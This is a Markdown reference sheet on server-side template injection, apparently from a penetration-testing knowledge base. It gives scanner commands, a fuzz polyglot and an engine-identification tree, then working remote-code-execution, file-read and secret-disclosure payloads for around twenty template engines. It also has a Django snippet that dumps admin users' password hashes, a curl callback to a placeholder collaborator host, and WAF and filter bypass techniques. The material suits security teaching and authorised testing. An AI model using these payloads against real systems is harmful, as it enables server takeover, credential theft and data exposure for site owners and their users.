# SSTI (Server-Side Template Injection)

> **Summary**: Injecting malicious template directives into server-side templates, causing the template engine to execute attacker-controlled code.
> **Impact**: Remote code execution, file read/write, full server compromise, information disclosure (secrets, config).
> **Typical Severity**: Critical

## Detection

### Indicators

- User input is reflected in rendered pages through a template engine
- Mathematical expressions are evaluated (e.g., `49` appears when submitting `{{7*7}}`)
- Error messages reveal template engine names (Jinja2, Twig, Freemarker, etc.)

### Automated Detection

```bash
# SSTImap - automated detection and exploitation
python3 sstimap.py -u "https://<TARGET>/page?name=John" -s

# TInjA - polyglot-based scanner
tinja url -u "https://<TARGET>/?name=test"

# Tplmap (legacy, Python 2)
python2.7 tplmap.py -u 'http://<TARGET>/page?name=John*'
```

### Manual Detection

#### Universal Fuzz String

Inject this polyglot into every input field and observe errors or unexpected output:

```
${{<%[%'"}}%\.
```

#### Decision Tree for Engine Identification

1. `{{7*7}}` -> `49`? If yes: Jinja2, Twig, or similar
2. `{{7*'7'}}` -> `7777777`? **Jinja2** (Python). If `49` -> **Twig** (PHP)
3. `${7*7}` -> `49`? **Freemarker**, **Velocity**, **Thymeleaf**, or **EL** (Java)
4. `<%= 7*7 %>` -> `49`? **ERB** (Ruby), **ASP**, or **Mojolicious** (Perl)
5. `#{7*7}` -> `49`? **Jade/Pug** (Node.js) or **Slim** (Ruby)
6. `{{7*7}}` -> Error? Check error message for engine name
7. `@(7*7)` -> `49`? **Razor** (.NET)

#### Blind SSTI Detection

- **Time-based**: Inject sleep/delay functions specific to the template engine
- **Out-of-band**: Use DNS/HTTP callbacks (e.g., `{{''.__class__.__mro__[1].__subclasses__()[X]('curl <COLLABORATOR>',shell=True)}}`)
- **Error-based**: Trigger distinct error messages (e.g., `{{7/0}}` for division by zero)

## Exploitation

### Prerequisites

- User input is rendered through a template engine without proper sanitization
- The template engine allows expression evaluation or code execution

### Step-by-Step

1. **Detect template injection** -- Submit the polyglot fuzz string and analyze the response
   - Success: Error messages, evaluated expressions, or missing characters
2. **Identify the template engine** -- Use the decision tree above
   - Success: Distinct behavior narrows it to a specific engine
3. **Read documentation** -- Understand the engine's built-in functions and security sandbox
4. **Explore the sandbox** -- Enumerate available objects, classes, and functions
5. **Escape the sandbox** -- Use MRO chains (Python), reflection (Java), or process access (Node.js)
6. **Achieve RCE** -- Execute OS commands through the identified escape chain

### Payloads (organized by engine)

---

#### Jinja2 (Python / Flask)

**Detection**:
```
{{7*'7'}} -> 7777777
{{config}}
{% debug %}
```

**Information Disclosure**:
```python
{{config.items()}}
{{settings.SECRET_KEY}}
{{request.environ}}
```

**RCE (MRO chain)**:
```python
{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id',shell=True,stdout=-1).communicate()[0] }}
```

**RCE (without guessing subclass index)**:
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

**RCE (via globals)**:
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**RCE (via config)**:
```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

---

#### Twig (PHP)

**Detection**:
```
{{7*7}} -> 49
{{7*'7'}} -> 49
```

**Information Disclosure**:
```php
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

**File Read**:
```php
{{'/etc/passwd'|file_excerpt(1,30)}}
```

**RCE**:
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}
```

---

#### Smarty (PHP)

**Detection**:
```
{$smarty.version}
```

**RCE**:
```php
{system('id')}
{system('cat /etc/passwd')}
```

---

#### Freemarker (Java)

**Detection**:
```
${7*7} -> 49
#{7*7} -> 49 (legacy)
```

**RCE**:
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Sandbox bypass (< 2.3.30)**:
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

#### Velocity (Java)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor())
#foreach($i in [1..$out.available()])$out.read()#end
```

---

#### Thymeleaf (Java / Spring)

**Detection**:
```
${7*7} -> 49
[[${7*7}]] -> 49 (expression inlining)
```

**RCE (SpringEL)**:
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**RCE (via preprocessing)**:
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

---

#### Pebble (Java)

**RCE (< 3.0.9)**:
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

---

#### ERB (Ruby)

**Detection**:
```
<%= 7*7 %> -> 49
```

**RCE**:
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= File.open('/etc/passwd').read %>
```

---

#### Slim (Ruby)

```ruby
{ %x|id| }
```

---

#### Handlebars (Node.js)

**RCE**:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

#### Jade / Pug (Node.js)

**Detection**:
```
#{7*7} -> 49
```

**RCE**:
```javascript
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

---

#### Nunjucks (Node.js)

**RCE**:
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

---

#### Mako (Python)

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

#### Tornado (Python)

```python
{% import os %}{{os.system('id')}}
```

---

#### Razor (.NET)

**Detection**: `@(2+2)` -> `4`

**RCE**:
```csharp
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

---

#### Django (Python)

**Detection**:
```
{% if 'str' == 'str' %} vuln {% endif %}
{% debug %}
```

**Information Disclosure**:
```
{% include 'admin/base.html' %}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

---

#### Go Templates

**Detection**:
```
{{ . }}
{{printf "%s" "ssti"}}
```

**RCE** (if object has exec method): `{{ .System "id" }}`

---

#### ASP / ASP.NET

**Detection**: `<%= 7*7 %>` -> `49`

**RCE**:
```asp
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>
```

### Proof of Concept

1. Submit `{{7*7}}` (or engine-appropriate syntax) in the target parameter
2. Verify `49` appears in the response
3. Escalate to `{{config}}` or equivalent to confirm sandbox access
4. Chain to OS command execution using the appropriate payload above

## Bypasses

- **Filter bypass (Jinja2)**: Use `|attr()` filter, hex encoding (`\x5f`), or `request` object to avoid blacklisted characters
- **Bypass `{{` blocking**: Use `{%` block syntax with `print()` or `include`
- **Bypass `_` blocking**: `request|attr(request.args.x)` with `?x=__class__`
- **Bypass `.` blocking**: `[]` notation or `|attr()` filter
- **WAF bypass**: Use [Fenjing](https://github.com/Marven11/Fenjing) for automated Jinja2 bypass generation
- **Bypass HTML encoding**: Use `|safe` filter in Jinja2/Flask

## Escalation

- SSTI -> RCE -> Full server compromise
- SSTI -> File read -> Source code / credential disclosure
- SSTI -> [XSS](xss.md) (if template output is rendered in browser without encoding)
- SSTI -> [LFI](lfi.md) (reading files via template functions)
- SSTI -> [Command Injection](command-injection.md) (executing OS commands)

## Tools

| Tool | Usage |
|------|-------|
| [SSTImap](https://github.com/vladko312/sstimap) | `sstimap.py -u "<URL>" -s` -- auto-detect and exploit |
| [TInjA](https://github.com/Hackmanit/TInjA) | `tinja url -u "<URL>"` -- polyglot-based SSTI+CSTI scanner |
| [Tplmap](https://github.com/epinna/tplmap) | `tplmap.py -u '<URL>'` -- legacy but supports many engines |
| [Template Injection Table](https://github.com/Hackmanit/template-injection-table) | Interactive reference for 44 template engines |
| [Fenjing](https://github.com/Marven11/Fenjing) | Automated Jinja2 WAF bypass / filter evasion |

## References

- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger Research - SSTI](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
- [Cobalt.io - SSTI Guide](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
- [SSTI Payloads](https://github.com/payloadbox/ssti-payloads)
- [Websites Vulnerable to SSTI (labs)](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
- [SecLists - Template Engine Special Vars](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

**See also**: [XSS](xss.md) | [Command Injection](command-injection.md) | [LFI](lfi.md)
